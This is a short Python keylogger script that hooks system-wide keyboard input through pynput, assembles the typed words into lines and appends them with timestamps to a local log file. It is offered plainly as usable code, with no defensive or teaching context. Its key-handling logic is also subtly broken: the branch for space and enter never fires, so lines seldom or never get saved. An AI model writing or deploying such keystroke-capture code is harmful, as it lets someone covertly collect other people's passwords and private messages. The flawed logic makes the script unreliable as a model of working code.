from pynput import keyboard
import time

log_file = 'keystrokes_log.txt'
current_word = ""
current_line = ""

def on_key_press(key):
    global current_word, current_line
    try:
        if hasattr(key, 'char'):
            current_word += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            if current_word:
                current_line += current_word + " "
                current_word = ""
        elif key == keyboard.Key.enter:
            if current_word:
                current_line += current_word + "\n"
                current_word = ""

        print_debug_info()

    if len(current_line) >= 100:
        save_current_line()

def print_debug_info():
    print("Current Line:", repr(current_line))
    print("Current Word:", repr(current_word))
    print("-------------")  # Separator

def save_current_line():
    global current_line
    if current_line:
        try:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {current_line}\n')
            current_line = ""
        except Exception as e:
            print("Error writing to file:", e)

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
